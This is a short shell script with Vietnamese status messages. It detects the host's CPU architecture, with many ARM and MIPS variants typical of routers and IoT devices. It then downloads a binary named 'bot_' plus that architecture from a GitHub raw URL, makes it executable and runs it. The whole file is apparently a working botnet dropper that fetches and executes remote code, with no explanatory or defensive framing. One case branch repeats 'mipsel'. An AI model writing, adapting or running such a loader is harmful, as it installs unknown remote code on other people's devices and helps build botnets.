BASE_URL="https://github.com/mdn-gay/1239277489294m/raw/refs/heads/main"
BINARY_PREFIX="bot"

detect_arch() {
    ARCH=$(uname -m | tr '[:upper:]' '[:lower:]')

    case "$ARCH" in
        x86_64|amd64)
            echo "amd64"
            ;;
        i386|i486|i586|i686)
            echo "386"
            ;;
        armv7l|armv7*|armv7a|armv7hf*)
            echo "armv7"
            ;;
        aarch64|arm64)
            echo "arm64"
            ;;
        mips64el|mips64le)
            echo "mips64le"
            ;;
        mips64)
            echo "mips64"
            ;;
        mipsel)
            echo "mipsel"
            ;;
        mipsel|mipsle)   
            echo "mips"
            ;;
        *)
            echo "unsupported"
            ;;
    esac
}

ARCH_SUFFIX=$(detect_arch)

if [ "$ARCH_SUFFIX" = "unsupported" ]; then
    echo "[-] Kiến trúc không được hỗ trợ: $(uname -m)"
    exit 1
fi

BINARY_NAME="${BINARY_PREFIX}_${ARCH_SUFFIX}"
TARGET_URL="$BASE_URL/$BINARY_NAME"

echo "[+] Kiến trúc : $ARCH_SUFFIX"
echo "[+] Tải từ   : $TARGET_URL"

if ! command -v wget >/dev/null 2>&1; then
    echo "[-] Không có wget"
    exit 1
fi

if ! wget -q "$TARGET_URL" -O "$BINARY_NAME"; then
    echo "[-] Tải binary thất bại"
    exit 1
fi

chmod +x "$BINARY_NAME"

echo "[+] Chạy $BINARY_NAME"
exec ./"$BINARY_NAME" 
